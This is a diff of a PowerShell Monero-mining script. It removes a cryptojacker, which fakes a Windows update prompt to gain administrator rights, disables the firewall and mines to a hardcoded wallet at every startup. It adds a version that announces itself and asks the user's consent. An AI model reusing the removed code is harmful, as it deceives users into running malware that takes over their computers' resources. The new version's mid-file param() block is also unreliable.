@@ -1,115 +1,199 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName PresentationFramework
+
 $ScriptPath = $MyInvocation.MyCommand.Path
 $ScriptDir  = Split-Path -Parent $ScriptPath
-$PSCommandPath = $ScriptDir + "\CryptoJack1.ps1"
-# Get the ID and security principal of the current user account
-$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent();
-$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID);
 
-# Get the security principal for the administrator role
-$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator;
+# Your Monero wallet address - REPLACE WITH YOUR OWN
+$WalletAddress = "437kg8epTG59BpCHXSHVkiAx7S7oawgkeLjPyga1fX8Ca48wmWueu8uiovHZPT1oVGf4MEjvkhypMh3fvgb1cX69GKQwXMp"
 
-function promptAdminRights
-{   Add-Type -AssemblyName System.Windows.Forms
+# Mining pool configuration
+$PoolUrl = "xmrpool.eu:3333"
+$PoolPassword = "x"
+
+function promptAdminRights {
+    Add-Type -AssemblyName System.Windows.Forms
     $global:balmsg = New-Object System.Windows.Forms.NotifyIcon
     $path = (Get-Process -id $pid).Path
     $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
     $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
-    $balmsg.BalloonTipText = "New Windows update available `r`n Click Here to View"
-    $balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
+    $balmsg.BalloonTipText = "Monero mining setup requires administrator privileges"
+    $balmsg.BalloonTipTitle = "XMRig Mining Setup"
     $balmsg.Visible = $true
-    $balmsg.ShowBalloonTip(0)
+    $balmsg.ShowBalloonTip(5000)
     $balmsg.dispose()
-    $msgBoxInput =  [System.Windows.MessageBox]::Show("Windows would like to update your system. `r`n Please give Powershell permission to update.",'Windows Software Update','YesNoCancel','Warning')
-    switch  ($msgBoxInput) 
-    {
-
-        'Yes' 
-        {
-            
-            
-          Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;              
-
-
+    
+    $msgBoxInput = [System.Windows.MessageBox]::Show("This script will set up automated Monero mining on your PC.`r`n`r`nIt needs administrator privileges to:`r`n- Download XMRig mining software`r`n- Configure firewall exceptions`r`n- Create startup task`r`n`r`nContinue?",'Monero Mining Setup','YesNo','Question')
+    
+    switch ($msgBoxInput) {
+        'Yes' {
+            Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
         }
-        'No'
-        {
-            promptAdminRights
-        }
-        'Cancel'
-        {
-            promptAdminRights
+        'No' {
+            Write-Host "Mining setup cancelled by user"
+            exit
         }
     }
 }
 
-function runScript 
-{
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    Write-Host Preparing Download ...    
+function setupFirewallException {
+    Write-Host "Setting up firewall exception for XMRig..."
+    
+    # Instead of disabling firewall, add specific exception
+    $xmrigPath = Join-Path $ScriptDir "xmrig-6.24.0\xmrig.exe"
+    
+    try {
+        # Remove existing rule if it exists
+        Remove-NetFirewallRule -DisplayName "XMRig Miner" -ErrorAction SilentlyContinue
+        
+        # Add new firewall rule for XMRig
+        New-NetFirewallRule -DisplayName "XMRig Miner" -Direction Outbound -Program $xmrigPath -Action Allow -Profile Any
+        Write-Host "Firewall exception created for XMRig"
+    }
+    catch {
+        Write-Host "Warning: Could not create firewall exception. Mining may still work."
+    }
+}
+
+function downloadAndSetupXMRig {
+    Write-Host "Downloading XMRig..."
+    
     $download = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
-    
-    $outputPath = $ScriptDir + "\test.zip"
+    $outputPath = Join-Path $ScriptDir "xmrig.zip"
     $destinationPath = $ScriptDir
-    $FilePath = $ScriptDir + "\WinUpdateTask.ps1"
 
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($download, $outputPath)
-    
-    Set-Location $destinationPath 
-
-    if(!(Test-Path $outputPath))
-    {
-        runScript
-    }
-    else
-    {
-        Write-Host "Files downloaded"
-        Clear-Host
-
-        # Extract the xmrig zip
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.DownloadFile($download, $outputPath)
+        
+        if (!(Test-Path $outputPath)) {
+            throw "Download failed"
+        }
+        
+        Write-Host "Download complete. Extracting..."
+        
+        # Extract the zip
         Expand-Archive -LiteralPath $outputPath -DestinationPath $destinationPath -Force
-
-        # Remove the zip after extraction
+        
+        # Clean up zip file
         Remove-Item -Path $outputPath
-
-        # Path to the xmrig executable inside extracted folder
-        $xmrigPath = Join-Path $destinationPath "xmrig-6.24.0\xmrig.exe"
-
-        Write-Host "Starting mining process..."
-
-        # Run xmrig mining process with pool, wallet address, and password 'x'
-        # Replace wallet address below with your own Monero wallet
-        # Define the log file path
-        $logPath = Join-Path $destinationPath "miner.log"
-        $logPathErr = Join-Path $destinationPath "miner_err.log"
-
-
-        # Start XMRig with output and error logging
-        Start-Process -FilePath $xmrigPath `
-            -ArgumentList "-o xmrpool.eu:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x" `
-            -RedirectStandardOutput $logPath `
-            -RedirectStandardError $logPathErr `
-            -NoNewWindow
-
-        # Keep scheduled task as before to run on startup
-        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
-        $action = New-ScheduledTaskAction Start-Process powershell $FilePath
-        Register-ScheduledTask -AsJob -Trigger $trigger -Action $action -TaskName CryptoJack -Force
-        Start-ScheduledTask -TaskName CryptoJack
-
-        Write-Host "Mining started"
+        
+        Write-Host "XMRig extracted successfully"
+        return $true
     }
-
+    catch {
+        Write-Host "Error downloading/extracting XMRig: $_"
+        return $false
+    }
 }
 
+function startMining {
+    $xmrigPath = Join-Path $ScriptDir "xmrig-6.24.0\xmrig.exe"
+    
+    if (!(Test-Path $xmrigPath)) {
+        Write-Host "XMRig executable not found!"
+        return $false
+    }
+    
+    Write-Host "Starting mining process..."
+    Write-Host "Pool: $PoolUrl"
+    Write-Host "Wallet: $WalletAddress"
+    
+    # Define log file paths
+    $logPath = Join-Path $ScriptDir "mining.log"
+    $logPathErr = Join-Path $ScriptDir "mining_error.log"
+    
+    try {
+        # Start XMRig with logging
+        Start-Process -FilePath $xmrigPath `
+            -ArgumentList "-o $PoolUrl -u $WalletAddress -p $PoolPassword --log-file=$logPath" `
+            -NoNewWindow `
+            -PassThru
+        
+        Write-Host "Mining started successfully!"
+        Write-Host "Log file: $logPath"
+        return $true
+    }
+    catch {
+        Write-Host "Error starting mining: $_"
+        return $false
+    }
+}
 
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{  
+function createStartupTask {
+    Write-Host "Creating startup task..."
+    
+    try {
+        # Remove existing task if it exists
+        Unregister-ScheduledTask -TaskName "MoneroMining" -Confirm:$false -ErrorAction SilentlyContinue
+        
+        # Create new task
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -AutoStart"
+        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Seconds 30)
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        
+        Register-ScheduledTask -TaskName "MoneroMining" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"
+        
+        Write-Host "Startup task created successfully"
+    }
+    catch {
+        Write-Host "Warning: Could not create startup task: $_"
+    }
+}
+
+function runMainScript {
+    Write-Host "=== Monero Mining Setup ==="
+    Write-Host "Wallet: $WalletAddress"
+    Write-Host "Pool: $PoolUrl"
+    Write-Host ""
+    
+    # Setup firewall exception
+    setupFirewallException
+    
+    # Download and setup XMRig if not already present
+    $xmrigPath = Join-Path $ScriptDir "xmrig-6.24.0\xmrig.exe"
+    if (!(Test-Path $xmrigPath)) {
+        if (!(downloadAndSetupXMRig)) {
+            Write-Host "Setup failed!"
+            Read-Host "Press Enter to exit"
+            exit 1
+        }
+    } else {
+        Write-Host "XMRig already installed"
+    }
+    
+    # Start mining
+    if (startMining) {
+        # Create startup task
+        createStartupTask
+        
+        Write-Host ""
+        Write-Host "=== Setup Complete ==="
+        Write-Host "Mining is now running and will start automatically on boot"
+        Write-Host "Check mining.log for performance statistics"
+    } else {
+        Write-Host "Mining setup failed!"
+    }
+    
+    Read-Host "Press Enter to exit"
+}
+
+# Handle auto-start parameter for scheduled task
+param([switch]$AutoStart)
+
+if ($AutoStart) {
+    # This is being run by the scheduled task
+    $xmrigPath = Join-Path $ScriptDir "xmrig-6.24.0\xmrig.exe"
+    if (Test-Path $xmrigPath) {
+        startMining | Out-Null
+    }
+    exit
+}
+
+# Check for admin rights
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     promptAdminRights
-}else
-{
-    runScript 
-} 
+} else {
+    runMainScript
+}
